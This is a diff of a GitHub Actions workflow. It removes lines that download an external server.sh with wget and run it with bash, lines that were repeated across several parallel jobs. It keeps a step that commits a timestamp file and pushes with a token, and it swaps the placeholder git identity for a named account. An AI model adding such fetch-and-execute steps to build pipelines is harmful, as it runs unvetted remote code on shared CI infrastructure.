@@ -14,44 +14,10 @@ jobs:
       - uses: actions/checkout@v3
       - name: Run a multi-line script
         run: |
-          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/server.sh
-          bash server.sh
           rm -rf random.txt
           echo $(date "+%Y%m%d%H%M%S") >> random.txt
-          git config --global user.email "you@example.com"
-          git config --global user.name "Your Name"
+          git config --global user.email "535128725@qq.com"
+          git config --global user.name "niniubiwoc"
           git add .
           git commit -m $(date "+%Y%m%d%H%M%S")
           git push https://$TOKEN@github.com/niniula/test.git
-  build2:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Run a multi-line script
-        run: |
-          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/server.sh
-          bash server.sh
-  build3:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Run a multi-line script
-        run: |
-          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/server.sh
-          bash server.sh
-  build4:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Run a multi-line script
-        run: |
-          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/server.sh
-          bash server.sh
-  build5:
-    runs-on: ubuntu-latest
-    steps:
-      - uses: actions/checkout@v3
-      - name: Run a multi-line script
-        run: |
-          wget https://raw.githubusercontent.com/niniubiwoc/Nm-L/main/server.sh
-          bash server.sh
